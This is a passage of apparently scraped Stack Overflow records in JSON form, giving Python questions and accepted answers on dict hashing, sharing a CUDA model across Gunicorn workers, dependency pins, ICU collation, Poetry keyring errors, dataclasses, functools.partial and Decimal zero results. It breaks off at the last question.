    "Body": "I have some log data like:\nlogs = [\n {'id': '1234', 'error': None, 'fruit': 'orange'},\n {'id': '12345', 'error': None, 'fruit': 'apple'}\n]\n\nEach dict has the same keys: 'id', 'error' and 'fruit' (in this example).\nI want to remove duplicates from this list, but straightforward dict and set based approaches do not work because my elements are themselves dicts, which are not hashable:\n>>> set(logs)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: unhashable type: 'dict'\n\nAnother approach is to sort and use itertools.groupby - but dicts are also not comparable, so this also does not work:\n>>> from itertools import groupby\n>>> [k for k, _ in groupby(sorted(logs))]\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: '<' not supported between instances of 'dict' and 'dict'\n\nI had the idea to calculate a hash value for each log entry, and store it in a set for comparison, like so:\ndef compute_hash(log_dict: dict):\n    return hash(log_dict.values())\n\ndef deduplicate(logs):\n    already_seen = set()\n    for log in logs:\n        log_hash = compute_hash(log)\n        if log_hash in already_seen:\n            continue\n        already_seen.add(log_hash)\n        yield log\n\nHowever, I found that compute_hash would give the same hash for different dictionaries, even ones with completely bogus contents:\n>>> logs = [{'id': '123', 'error': None, 'fruit': 'orange'}, {}]\n>>> # The empty dict will be removed; every dict seems to get the same hash.\n>>> list(deduplicate(logs))\n[{'id': '123', 'error': None, 'fruit': 'orange'}]\n\nAfter some experimentation, I was seemingly able to fix the problem by modifying compute_hash like so:\ndef compute_hash(log_dict: dict):\n    return hash(frozenset(log_dict.values()))\n\nHowever, I cannot understand why this makes a difference. Why did the original version seem to give the same hash for every input dict? Why does converting the .values result to a frozenset first fix the problem?\nAside from that: is this algorithm correct? Or is there some counterexample where the wrong values will be removed?\n\nThis question discusses how hashing works in Python, in depth, as well as considering other data structures that might be more appropriate than dictionaries for the list elements. See List of unique dictionaries instead if you simply want to remove duplicates from a list of dictionaries.\n",
    "AcceptedAnswerId": 74965910,
    "AcceptedAnswer": "What went wrong\nThe first thing I want to point out about the original attempt is that it seems over-engineered. When the inputs are hashable, manually iterating is only necessary to preserve order, and even then, in 3.7 and up we can rely on the order-preserving property of dicts.\nJust because it's hashable doesn't mean the hash is useful\nIt also isn't especially useful to call hash on log_dict.values(). While log_dict is not hashable, its .values() (in 3.x) is an instance of the dict_values type (the name is not defined in the builtins, but that is how instances identify themselves), which is hashable:\n>>> dv = {1:2, 3:4}.values()\n>>> dv\ndict_values([2, 4])\n>>> {dv}\n{dict_values([2, 4])}\n\nSo we could just as easily have used the .values() directly as a \"hash\":\ndef compute_hash(log_dict: dict):\n    return log_dict.values()\n\n... but this would have given a new bug - now every hash would be different:\n>>> {1:2}.values() == {1:2}.values()\nFalse\n\nBut why?\nBecause dict_values type doesn't define __hash__, nor __eq__. object is the immediate superclass, so calls to those methods fall back to the object defaults:\n>>> dv.__class__.__bases__\n(,)\n>>> dv.__class__.__hash__\n\n>>> dv.__class__.__eq__\n\n\nIn fact, dict_values cannot sensibly implement these methods because it is (indirectly) mutable - as a view, it is dependent on the underlying dict:\n>>> d = {1:2}\n>>> dv = d.values()\n>>> d[3] = 4\n>>> dv\ndict_values([2, 4])\n\nSince there isn't an obvious generic way to hash any object that also isn't exceedingly slow, while also caring about its actual attributes, the default simply doesn't care about attributes and is simply based on object identity. For example, on my platform, the results look like:\nPython 3.8.10 (default, Nov 14 2022, 12:59:47) \n[GCC 9.4.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> dv = {1:2, 3:4}.values()\n>>> bin(id(dv))\n'0b11111110101110011010010110000001010101011110000'\n>>> bin(hash(dv))\n'0b1111111010111001101001011000000101010101111'\n\nIn other words:\n>>> hash(dv) == id(dv) // 16\nTrue\n\nThus, if compute_hash in the original code is repeatedly called with temporary objects, it won't give useful results - the results don't depend on the contents of the object, and will commonly be the same, as temporary (i.e., immediately GCd) objects in a loop will often end up in the same memory location.\n(Yes, this means that objects default to being hashable and equality-comparable. The dict type itself overrides __hash__ to explicitly disallow it, while - curiously - overriding __eq__ to compare contents.)\nfrozenset has a useful hash\nOn the other hand, frozenset is intended for long-term storage of some immutable data. Consequently, it's important and useful for it to define a __hash__, and it does:\n>>> f = frozenset(dv)\n>>> bin(id(f))\n'0b11111110101110011010001011101000110001011100000'\n>>> bin(hash(f))\n'0b101111010001101001001111100001000001100111011101101100000110001'\n\nDictionaries, hashing and collision detection\nAlthough there have been many tweaks and optimizations over the years, Pythons dict and set types are both fundamentally based on hash tables. When a value is inserted, its hash is first computed (normally an integer value), and then that value is reduced (normally using modulo) into an index into the underlying table storage. Similarly, when a value is looked up, the hash is computed and reduced in order to determine where to look in the table for that value.\nOf course, it is possible that some other value is already stored in that spot. There are multiple possible strategies for dealing with this (and last I checked, the literature is inconsistent about naming them). But most importantly for our purposes: when looking up a value in a dict by key, or checking for the presence of a value in a set, the container will also have to do equality checks after figuring out where to look, in order to confirm that the right thing has actually been found.\nConsequently, any approach that simply computes a hash manually, and naively associates those hashes with the original values, will fail. It is easy for two of the input dicts to have the same computed hash value, even if their contents are actually being considered. For example, the hash of a frozenset is based on an XOR of hashes for the elements. So if two of our input dicts had all the same values assigned to keys in a different order, the hash would be the same:\n>>> def show_hash(d):\n...     return bin(hash(frozenset(d.values())))\n... \n>>> show_hash({'id': '1', 'error': None, 'value': 'apple'})\n'0b101010010100001000111001000001000111101111110100010000010101110'\n>>> # Changing a value changes the hash...\n>>> show_hash({'id': '1', 'error': None, 'value': 'orange'})\n'0b11111111001000011101011001001011100010100100010010110000100100'\n>>> # but rearranging them does not:\n>>> show_hash({'id': '1', 'error': 'orange', 'value': None})\n'0b11111111001000011101011001001011100010100100010010110000100100'\n\nIt's also possible for such a hash collision to occur by coincidence with totally unrelated values. It's extremely unlikely for 64-bit hashes (since this value will not be reduced and used as a hash table index, despite the name)\nFixing it explicitly\nSo, in order to have correct code, we would need to do our own checking afterwards, explicitly checking whether the value which hashed to something in our already_seen set was actually equal to previous values that had that hash. And there could theoretically be multiple of those, so we'd have to remember multiple values for each of those external hashes, perhaps by using a dict for already_seen instead. Something like:\nfrom collections import defaultdict\n\ndef deduplicate(logs):\n    already_seen = defaultdict(list)\n    for log in logs:\n        log_hash = compute_hash(log)\n        if log in already_seen.get(log_hash, ()):\n            continue\n        already_seen[log_hash].append(log)\n        yield log\n\nHopefully this immediately looks unsatisfactory. With this approach, we are essentially re-implementing the core logic of sets and dictionaries - we compute hashes ourselves, retrieve corresponding values from internal storage (already_seen) and then manually check for equality (if log in ...).\nLooking at it from another angle\nThe reason we're doing all of this in the first place - looking for a hash value to represent the original dict in our own storage - is because the dict isn't hashable. But we could address that problem head-on, instead, by explicitly converting the data into a hashable form (that preserves all the information), rather than trying to relate a hashable value to the data.\nIn other words, let's use a different type to represent the data, rather than a dict.\nSince all our input dicts have the same keys, the natural thing to do would be to convert those into the attributes of a user-defined class. In 3.7 and up, a simple, natural and explicit way to do this is using a dataclass, like so:\nfrom dataclasses import dataclass\nfrom typing import Optional\n\n@dataclass(frozen=True, slots=True)\nclass LogEntry:\n    id: str\n    error: Optional[str]\n    fruit: str\n\nIt's not explained very well in the documentation, but using frozen=True (the main purpose is to make the instances immutable) will cause a __hash__ to be generated as well, taking the fields into account as desired. Using slots=True causes __slots__ to be generated for the type as well, avoiding memory overhead.\nFrom here, it's trivial to convert the existing logs:\nlogs = [LogEntry(**d) for d in logs]\n\nAnd we can directly deduplicate with a set:\nset(logs)\n\nor, preserving order using a dict (in 3.7 and up):\nlist(dict.fromkeys(logs))\n\nThere are other options, of course. The simplest is to make a tuple from the .values - assuming each log dict has its keys in the same order (again, assuming Python 3.7 and up, where keys have an order), this preserves all the useful information - the .keys are just for convenience. Slightly more sophisticated, we could use collections.namedtuple:\nfrom collections import namedtuple\n\nLogEntry = namedtuple('LogEntry', 'id error fruit')\n# from here, use the LogEntry type as before\n\nThis is simpler than the dataclass approach, but less explicit (and doesn't offer an elegant way to document field types).\n"
}
{
    "Id": 72779926,
    "PostTypeId": 1,
    "Title": "GUnicorn + CUDA: Cannot re-initialize CUDA in forked subprocess",
    "Body": "I am creating an inference service with torch, gunicorn and flask that should use CUDA. To reduce resource requirements, I use the preload option of gunicorn, so the model is shared between the worker processes. However, this leads to an issue with CUDA. The following code snipped shows a minimal reproducing example:\nfrom flask import Flask, request\nimport torch\n\napp = Flask('dummy')\n\nmodel = torch.rand(500)\nmodel = model.to('cuda:0')\n\n\n@app.route('/', methods=['POST'])\ndef f():\n    data = request.get_json()\n    x = torch.rand((data['number'], 500))\n    x = x.to('cuda:0')\n    res = x * model\n    return {\n        \"result\": res.sum().item()\n    }\n\nStarting the server with CUDA_VISIBLE_DEVICES=1 gunicorn -w 3 -b $HOST_IP:8080 --preload run_server:app lets the service start successfully. However, once doing the first request (curl -X POST -d '{\"number\": 1}'), the worker throws the following error:\n[2022-06-28 09:42:00,378] ERROR in app: Exception on / [POST]\nTraceback (most recent call last):\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 2447, in wsgi_app\n    response = self.full_dispatch_request()\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1952, in full_dispatch_request\n    rv = self.handle_user_exception(e)\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1821, in handle_user_exception\n    reraise(exc_type, exc_value, tb)\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/_compat.py\", line 39, in reraise\n    raise value\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1950, in full_dispatch_request\n    rv = self.dispatch_request()\n  File \"/home/user/.local/lib/python3.6/site-packages/flask/app.py\", line 1936, in dispatch_request\n    return self.view_functions[rule.endpoint](**req.view_args)\n  File \"/home/user/project/run_server.py\", line 14, in f\n    x = x.to('cuda:0')\n  File \"/home/user/.local/lib/python3.6/site-packages/torch/cuda/__init__.py\", line 195, in _lazy_init\n    \"Cannot re-initialize CUDA in forked subprocess. \" + msg)\nRuntimeError: Cannot re-initialize CUDA in forked subprocess. To use CUDA with multiprocessing, you must use the 'spawn' start method\n\nI load the model in the parent process and it's accessible to each forked worker process. The problem occurs when creating a CUDA-backed tensor in the worker process. This re-initializes the CUDA context in the worker process, which fails because it was already initialized in the parent process. If we set x = data['number'] and remove x = x.to('cuda:0'), the inference succeeds.\nAdding torch.multiprocessing.set_start_method('spawn') or multiprocessing.set_start_method('spawn') won't change anything, probably because gunicorn will definitely use fork when being started with the --preload option.\nA solution could be not using the --preload option, which leads to multiple copies of the model in memory/GPU. But this is what I am trying to avoid.\nIs there any possibility to overcome this issue without loading the model separately in each worker process?\n",
    "AcceptedAnswerId": 75308606,
    "AcceptedAnswer": "Reason for the Error\nAs correctly stated in the comments by @Newbie, the issue isn't the model itself, but the CUDA context. When new child processes are forked, the parent's memory is shared read-only with the child, but the CUDA context doesn't support this sharing, it must be copied to the child. Hence, it reports above-mentioned error.\nSpawn instead of Fork\nTo resolve this issue, we have to change the start method for the child processes from fork to spawn with multiprocessing.set_start_method. The following simple example works fine:\nimport torch\nimport torch.multiprocessing as mp\n\n\ndef f(y):\n    y[0] = 1000\n\n\nif __name__ == '__main__':\n    x = torch.zeros(1).cuda()\n    x.share_memory_()\n\n    mp.set_start_method('spawn')\n    p = mp.Process(target=f, args=(x,), daemon=True)\n    p.start()\n    p.join()\n    print(\"x =\", x.item())\n\nWhen running this code, a second CUDA context is initialized (this can be observed via watch -n 1 nvidia-smi in a second window), and f is executed after the context was initialized completely. After this, x = 1000.0 is printed on the console, thus, we confirmed that the tensor x was successfully shared between the processes.\nHowever, Gunicorn internally uses os.fork to start the worker processes, so multiprocessing.set_start_method has no influence on Gunicorn's behavior. Consequently, initializing the CUDA context in the root process must be avoided.\nSolution for Gunicorn\nIn order to share the model among the worker processes, we thus must load the model in one single process and share it with the workers. Luckily, sending a CUDA tensor via a torch.multiprocessing.Queue to another process doesn't copy the parameters on the GPU, so we can use those queues for this problem.\nimport time\n\nimport torch\nimport torch.multiprocessing as mp\n\n\ndef f(q):\n    y = q.get()\n    y[0] = 1000\n\n\ndef g(q):\n    x = torch.zeros(1).cuda()\n    x.share_memory_()\n    q.put(x)\n    q.put(x)\n    while True:\n        time.sleep(1)  # this process must live as long as x is in use\n\n\nif __name__ == '__main__':\n    queue = mp.Queue()\n    pf = mp.Process(target=f, args=(queue,), daemon=True)\n    pf.start()\n    pg = mp.Process(target=g, args=(queue,), daemon=True)\n    pg.start()\n    pf.join()\n    x = queue.get()\n    print(\"x =\", x.item())  # Prints x = 1000.0\n\nFor the Gunicorn server, we can use the same strategy: A model server process loads the model and serves it to each new worker process after its fork. In the post_fork hook the worker requests and receives the model from the model server. A Gunicorn configuration could look like this:\nimport logging\n\nfrom client import request_model\nfrom app import app\n\nlogging.basicConfig(level=logging.INFO)\n\nbind = \"localhost:8080\"\nworkers = 1\nzmq_url = \"tcp://127.0.0.1:5555\"\n\n\ndef post_fork(server, worker):\n    app.config['MODEL'], app.config['COUNTER'] = request_model(zmq_url)\n\nIn the post_fork hook, we call request_model to get a model from the model server and store the model in the configuration of the Flask application. The method request_model is defined in my example in the file client.py and defined as follows:\nimport logging\nimport os\n\nfrom torch.multiprocessing.reductions import ForkingPickler\nimport zmq\n\n\ndef request_model(zmq_url: str):\n    logging.info(\"Connecting\")\n    context = zmq.Context()\n    with context.socket(zmq.REQ) as socket:\n        socket.connect(zmq_url)\n        logging.info(\"Sending request\")\n        socket.send(ForkingPickler.dumps(os.getpid()))\n        logging.info(\"Waiting for a response\")\n        model = ForkingPickler.loads(socket.recv())\n    logging.info(\"Got response from object server\")\n    return model\n\nWe make use of ZeroMQ for inter-process communication here because it allows us to reference servers by name/address and to outsource the server code into its own application. multiprocessing.Queue and multiprocessing.Process apparently don't work well with Gunicorn. multiprocessing.Queue uses the ForkingPickler internally to serialize the objects, and the module torch.multiprocessing alters it in a way that Torch data structures can be serialized appropriately and reliably. So, we use this class to serialize our model to send it to the worker processes.\nThe model is loaded and served in an application that is completely separate from Gunicorn and defined in server.py:\nfrom argparse import ArgumentParser\nimport logging\n\nimport torch\nfrom torch.multiprocessing.reductions import ForkingPickler\nimport zmq\n\n\ndef load_model():\n    model = torch.nn.Linear(10000, 50000)\n    model.cuda()\n    model.share_memory()\n\n    counter = torch.zeros(1).cuda()\n    counter.share_memory_()\n    return model, counter\n\n\ndef share_object(obj, url):\n    context = zmq.Context()\n    socket = context.socket(zmq.REP)\n    socket.bind(url)\n    while True:\n        logging.info(\"Waiting for requests on %s\", url)\n        message = socket.recv()\n        logging.info(\"Got a message from %d\", ForkingPickler.loads(message))\n        socket.send(ForkingPickler.dumps(obj))\n\n\nif __name__ == '__main__':\n    parser = ArgumentParser(description=\"Serve model\")\n    parser.add_argument(\"--listen-address\", default=\"tcp://127.0.0.1:5555\")\n    args = parser.parse_args()\n\n    logging.basicConfig(level=logging.INFO)\n    logging.info(\"Loading model\")\n    model = load_model()\n    share_object(model, args.listen_address)\n\nFor this test, we use a model of about 2GB in size to see an effect on the GPU memory allocation in nvidia-smi and a small tensor to verify that the data is actually shared among the processes.\nOur sample flask application runs the model with a random input, counts the number of requests and returns both results:\nfrom flask import Flask\nimport torch\n\napp = Flask(__name__)\n\n\n@app.route(\"/\", methods=[\"POST\"])\ndef infer():\n    model: torch.nn.Linear = app.config['MODEL']\n    counter: torch.Tensor = app.config['COUNTER']\n    counter[0] += 1  # not thread-safe\n    input_features = torch.rand(model.in_features).cuda()\n    return {\n        \"result\": model(input_features).sum().item(),\n        \"counter\": counter.item()\n    }\n\nTest\nThe example can be run as follows:\n$ python server.py &\nINFO:root:Waiting for requests on tcp://127.0.0.1:5555 \n$ gunicorn -c config.py app:app\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Starting gunicorn 20.1.0\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Listening at: http://127.0.0.1:8080 (24113)\n[2023-02-01 16:45:34 +0800] [24113] [INFO] Using worker: sync\n[2023-02-01 16:45:34 +0800] [24186] [INFO] Booting worker with pid: 24186\nINFO:root:Connecting\nINFO:root:Sending request\nINFO:root:Waiting for a response\nINFO:root:Got response from object server\n\nUsing nvidia-smi, we can observe that now, two processes are using the GPU, and one of them allocates 2GB more VRAM than the other. Querying the flask application also works as expected:\n$ curl -X POST localhost:8080\n{\"counter\":1.0,\"result\":-23.956459045410156} \n$ curl -X POST localhost:8080\n{\"counter\":2.0,\"result\":-8.161510467529297}\n$ curl -X POST localhost:8080\n{\"counter\":3.0,\"result\":-37.823692321777344}\n\nLet's introduce some chaos and terminate our only Gunicorn worker:\n$ kill 24186\n[2023-02-01 18:02:09 +0800] [24186] [INFO] Worker exiting (pid: 24186)\n[2023-02-01 18:02:09 +0800] [4196] [INFO] Booting worker with pid: 4196\nINFO:root:Connecting\nINFO:root:Sending request\nINFO:root:Waiting for a response\nINFO:root:Got response from object server\n\nIt's restarting properly and ready to answer our requests.\nBenefit\nInitially, the amount of required VRAM for our service was (SizeOf(Model) + SizeOf(CUDA context)) * Num(Workers). By sharing the weights of the model, we can reduce this by SizeOf(Model) * (Num(Workers) - 1) to SizeOf(Model) + SizeOf(CUDA context) * Num(Workers).\nCaveats\nThe reliability of this approach relies on the single model server process. If that process terminates, not only will newly started workers get stuck, but the models in the existing workers will become unavailable and all workers crash at once. The shared tensors/models are only available as long as the server process is running. Even if the model server and Gunicorn workers are restarted, a short outage is certainly unavoidable. In a production environment, you thus should make sure this server process is kept alive.\nAdditionally, sharing data among different processes can have side effects. When sharing changeable data, proper locks must be used to avoid race conditions.\n"
}
{
    "Id": 74939758,
    "PostTypeId": 1,
    "Title": "Camelot: DeprecationError: PdfFileReader is deprecated",
    "Body": "I have been using camelot for our project, but since 2 days I got following errorMessage. When trying to run following code snippet:\nimport camelot\ntables = camelot.read_pdf('C:\\\\Users\\\\user\\\\Downloads\\\\foo.pdf', pages='1')\n\nI get this error:\nDeprecationError: PdfFileReader is deprecated and was removed in PyPDF2 3.0.0. Use PdfReader instead.\n\nI checked this file and it does use pdfFileReader: c:\\ProgramData\\Anaconda3\\lib\\site-packages\\camelot\\handlers.py\nI thought that I can specify the version of PyPDF2, but it will be installed automatically(because the library is used by camelot) when I install camelot. Do you think there is any solution to specify the version of PyPDF2 manually?\n",
    "AcceptedAnswerId": 74957139,
    "AcceptedAnswer": "This is issues #339.\nWhile there will hopefully be soon a release including the fix, you can still do this:\npip install 'PyPDF2<3.0'\n\nafter you've installed camelot.\nSee https://github.com/camelot-dev/camelot/issues/339#issuecomment-1367331630 for details and screenshots.\n"
}
{
    "Id": 73823743,
    "PostTypeId": 1,
    "Title": "AttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'",
    "Body": "After upgrading djangorestframework from djangorestframework==3.13.1 to djangorestframework==3.14.0 the code\nfrom rest_framework.serializers import NullBooleanField\n\nThrows\n\nAttributeError: module 'rest_framework.serializers' has no attribute 'NullBooleanField'\n\nReading the release notes I don't see a deprecation. Where did it go?\n",
    "AcceptedAnswerId": 74221187,
    "AcceptedAnswer": "For what it's worth, there's a deprecation warning in the previous version, which also suggests a fix:\n\nThe NullBooleanField is deprecated and will be removed starting with 3.14. Instead use the BooleanField field and set allow_null=True which does the same thing.\n\n"
}
{
    "Id": 74058262,
    "PostTypeId": 1,
    "Title": "icu: Sort strings based on 2 different locales",
    "Body": "As you probably know, the order of alphabet in some (maybe most) languages is different than their order in Unicode. That's why we may want to use icu.Collator to sort, like this Python example:\nfrom icu import Collator, Locale\ncollator = Collator.createInstance(Locale(\"fa_IR.UTF-8\"))\nmylist.sort(key=collator.getSortKey)\n\nThis works perfectly for Persian strings. But it also sorts all Persian strings before all ASCII / English strings (which is the opposite of Unicode sort).\nWhat if we want to sort ASCII before this given locale?\nOr ideally, I want to sort by 2 or multiple locales. (For example give multiple Locale arguments to Collator.createInstance)\nIf we could tell collator.getSortKey to return empty bytes for other locales, then I could create a tuple of 2 collator.getSortKey() results, for example:\nfrom icu import Collator, Locale\n\ncollator1 = Collator.createInstance(Locale(\"en_US.UTF-8\"))\ncollator2 = Collator.createInstance(Locale(\"fa_IR.UTF-8\"))\n\ndef sortKey(s):\n    return collator1.getSortKey(s), collator2.getSortKey(s)\n\nmylist.sort(key=sortKey)\n\nBut looks like getSortKey always returns non-empty bytes.\n",
    "AcceptedAnswerId": 75442315,
    "AcceptedAnswer": "A bit late to answer the question, but here it is for future reference.\nICU collation uses the CLDR Collation Algorithm, which is a tailoring of the Unicode Collation Algorithm. The default collation is referred to as the root collation. Don't think in terms of Locales having a set of collation rules, think more in terms of locales specify any differences between the collation rules that the locale needs and the root collation. CLDR takes a minimalist approach, you only need to include the minimal set of differences needed based on the root collation.\nEnglish uses the root locale. No tailorings. Persian on the other hand has a few rules needed to override certain aspects of the root collation.\nAs the question indicates, the Persian collation rules order Arabic characters before Latin characters. In the collation rule set for Persian there is a rule [reorder Arab]. This rule is what you need to override.\nThere are a few ways to do this:\n\nUse icu.RuleBasedCollator with a coustom set fo rules for Persian.\nCreate a standard Persian collation, retrieve the rules, strip out the reorder directive and then use modified rules with icu.RuleBasedCollator.\nCreate collator instance using a BCP-47 language tag, instead of a Locale identifier\n\nThere are other approaches as well, but the third is the simplest:\nloc = Locale.forLanguageTag(\"fa-u-kr-latn-arab\")\ncollator = Collator.createInstance(loc)\nsorted(mylist, key=collator.getSortKey)\n\nThis will reorder the Persian collation rules, placing Latin script before Arabic script, then everything else afterwards.\n"
}
{
    "Id": 74392324,
    "PostTypeId": 1,
    "Title": "Poetry install throws WinError 1312 when running over SSH on Windows 10",
    "Body": "I have an SSH connection from a Windows machine to another, and then trying to do a poetry install.\nMy problem is:\nI get this error when executing poetry install through ssh:\n[WinError 1312] A specified logon session does not exist. It may already have been terminated.\n\nThis command works perfectly when I execute it locally on the target machine, but fails when connecting through ssh.\nHow can I get rid/fix the [WinError 1312]?\nI saw another user that posted the same question recently, but removed it.\nI've seen some clues regarding the MachineKeys, but have really no idea on how to proceed. Any suggestion will be highly appreciated.\n\nPython: 3.10.8\nPoetry: 1.2.1\nInstalling dependencies from lock file\n\nPackage operations: 5 installs, 0 updates, 0 removals\n\n  \u2022 Installing install-requires (0.3.0)\n\n  OSError\n\n  [WinError 1312] A specified logon session does not exist. It may already have been terminated.\n\n  at ~\\AppData\\Roaming\\pypoetry\\venv\\lib\\site-packages\\win32ctypes\\core\\ctypes\\_util.py:53 in check_zero\n       49\u2502\n       50\u2502 def check_zero_factory(function_name=None):\n       51\u2502     def check_zero(result, function, arguments, *args):\n       52\u2502         if result == 0:\n    \u2192  53\u2502             raise make_error(function, function_name)\n       54\u2502         return result\n       55\u2502     return check_zero\n       56\u2502\n       57\u2502\n\nThe following error occurred when trying to handle this error:\n\n\n  error\n\n  (1312, 'CredRead', 'A specified logon session does not exist. It may already have been terminated.')\n\n  at ~\\AppData\\Roaming\\pypoetry\\venv\\lib\\site-packages\\win32ctypes\\pywin32\\pywintypes.py:37 in pywin32error\n       33\u2502 def pywin32error():\n       34\u2502     try:\n       35\u2502         yield\n       36\u2502     except WindowsError as exception:\n    \u2192  37\u2502         raise error(exception.winerror, exception.function, exception.strerror)\n       38\u2502\n\n",
    "AcceptedAnswerId": 74973503,
    "AcceptedAnswer": "Based on similarities in the stack traces and your description, my guess is that you're facing the same bug from #1892 and #1917, where Poetry tries to use your keyring to access/publish modules, and hence fails when these credentials are invalid.\n\nBut it appears that poetry tries to access the keyring even for install operations.\n\nOne of the solutions proposed was to uninstall the keyring package remotely:\n\nFor me, I worked around the problem by pip uninstalling the 'keyring' package from that virt env.\n\nAnother solution is to export the environment variable PYTHON_KEYRING_BACKEND. Here's an example of how you can do that on Windows:\nSET PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring\n\n... and on Linux:\nexport PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring\n\nUnfortunately, it appears that issue #1917 is still open and unresolved, so this is the best workaround that you can find to fix the issue for now.\n"
}
{
    "Id": 74262112,
    "PostTypeId": 1,
    "Title": "dataclasses: how to ignore default values using asdict()?",
    "Body": "I would like to ignore the default values after calling asdict()\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\nso if I call\na = A(\"1\")\nresult = asdict(a, ignore_default=True) \nassert {\"a\": \"1\"} == result  # the \"b\": True should be deleted\n\n",
    "AcceptedAnswerId": 74293119,
    "AcceptedAnswer": "The dataclasses module doesn't appear to have support for detecting default values in asdict(), however the dataclass-wizard library does -- via skip_defaults argument.\nExample:\nfrom dataclasses import dataclass\nfrom dataclass_wizard import asdict\n\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\na = A(\"1\")\nresult = asdict(a, skip_defaults=True)\nassert {\"a\": \"1\"} == result  # the \"b\": True should be deleted\n\nFurther, results show it is close to 2x faster than an approach with dataclasses.adict().\nI've added benchmark code I used for testing below.\nfrom dataclasses import dataclass, asdict as asdict_orig, MISSING\nfrom timeit import timeit\n\nfrom dataclass_wizard import asdict\n\n@dataclass\nclass A:\n    a: str\n    b: bool = True\n\n\ndef asdict_factory(cls):\n    def factory(obj: list[tuple]) -> dict:\n        d = {}\n        for k, v in obj:\n            field_value = cls.__dataclass_fields__[k].default\n            if field_value is MISSING or field_value != v:\n                d[k] = v\n        return d\n\n    return factory\n\na = A(\"1\")\nA_fact = asdict_factory(A)\n\nprint('dataclass_wizard.asdict():  ', timeit('asdict(a, skip_defaults=True)', globals=globals()))\nprint('dataclasses.asdict():       ', timeit('asdict_orig(a, dict_factory=A_fact)', globals=globals()))\n\nresult1 = asdict(a, skip_defaults=True)\nresult2 = asdict_orig(a, dict_factory=A_fact)\n\nassert {\"a\": \"1\"} == result1 == result2\n\na2 = A(\"1\", True)\na3 = A(\"1\", False)\nassert asdict(a2, skip_defaults=True) == asdict_orig(a2, dict_factory=A_fact)\nassert asdict(a3, skip_defaults=True) == asdict_orig(a3, dict_factory=A_fact)\n\n\nDisclaimer: I am the creator and maintainer of this library.\n"
}
{
    "Id": 74307236,
    "PostTypeId": 1,
    "Title": "Python: Why do functools.partial functions not become bound methods when set as class attributes?",
    "Body": "I was reading about how functions become bound methods when being set as class atrributes. I then observed that this is not the case for functions that are wrapped by functools.partial. What is the explanation for this?\nSimple example:\nfrom functools import partial\n\ndef func1():\n    print(\"foo\")\n\nfunc1_partial = partial(func1)\n\nclass A:\n    f = func1\n    g = func1_partial\n\na = A()\n\n\na.f() # TypeError: func1() takes 0 positional arguments but 1 was given\n\na.g() # prints \"foo\"\n\n\nI kind of expected them both to behave in the same way.\n",
    "AcceptedAnswerId": 74307329,
    "AcceptedAnswer": "The trick that allows functions to become bound methods is the __get__ magic method.\nTo very briefly summarize that page, when you access a field on an instance, say foo.bar, Python first checks whether bar exists in foo's __dict__ (or __slots__, if it has one). If it does, we return it, no harm done. If not, then we look on type(foo). However, when we access the field Foo.bar on the class Foo through an instance, something magical happens. When we write foo.bar, assuming there is no bar on foo's __dict__ (resp. __slots__), then we actually call Foo.bar.__get__(foo, Foo). That is, Python calls a magic method asking the object how it would like to be retrieved.\nThis is how properties are implemented, and it's also how bound methods are implemented. Somewhere deep down (probably written in C), there's a __get__ function on the type function that binds the method when accessed through an instance.\nfunctools.partial, despite looking a lot like a function, is not an instance of the type function. It's just a random class that happens to implement __call__, and it doesn't implement __get__. Why doesn't it? Well, they probably just didn't think it was worth it, or it's possible nobody even considered it. Regardless, the \"bound method\" trick applies to the type called function, not to all callable objects.\n\nAnother useful resource on magic methods, and __get__ in particular: https://rszalski.github.io/magicmethods/#descriptor\n"
}
{
    "Id": 74467875,
    "PostTypeId": 1,
    "Title": "VS Code: \"The isort server crashed 5 times in the last 3 minutes...\"",
    "Body": "I may have messed up some environmental path variables.\nI was tinkering around VS Code while learning about Django and virtual environments, and changing the directory path of my Python install. While figuring out how to point VS Code's default Python path, I deleted some User path variables.\nThen, isort began to refuse to run.\nI've tried uninstalling the extension(s), deleting the ms-python.'s, and uninstalling VS Code itself, clearing the Python Workspace Interpreter Settings, and restarting my computer.\nEven if it's not my path variables, anyone know the defaults that should be in the \"user\" paths variables?\n",
    "AcceptedAnswerId": 74488407,
    "AcceptedAnswer": "I ended up refreshing my Windows install. Was for the best because I'm repurposing an older machine anyway.\n"
}
{
    "Id": 74500614,
    "PostTypeId": 1,
    "Title": "Python Decimal - multiplication by zero",
    "Body": "Why does the following code:\nfrom decimal import Decimal\nresult = Decimal('0') * Decimal('0.8881783462119193534061639577')\nprint(result)\n\nreturn 0E-28 ?\nI've traced it to the following code in the module:\nif not self or not other:\n    ans = _dec_from_triple(resultsign, '0', resultexp)\n    # Fixing in case the exponent is out of bounds\n    ans = ans._fix(context)\n    return ans\n\nThe code appears to follow Decimal Arithmetic Specification, which doesn't explicitly suggest what to do when we multiply by zero, referring to 'special numbers' from another standard, which also doesn't specify what we do when we multiply an integer by zero  :)\nSo the decimal library does the thing that is explicitly specified:\n\nThe coefficient of the result, before rounding, is computed by multiplying together the coefficients of the operands.\nThe exponent of the result, before rounding, is the sum of the exponents of the two operands.\nThe sign of the result is the exclusive or of the signs of the operands.\n\nQuestion: what is the need to return the coefficient and exponent (i.e, 0E-28) if one of the operands is a zero? We already know what that coefficient is when calling the multiplication function. Why not just return zero?\n",
    "AcceptedAnswerId": 74515870,
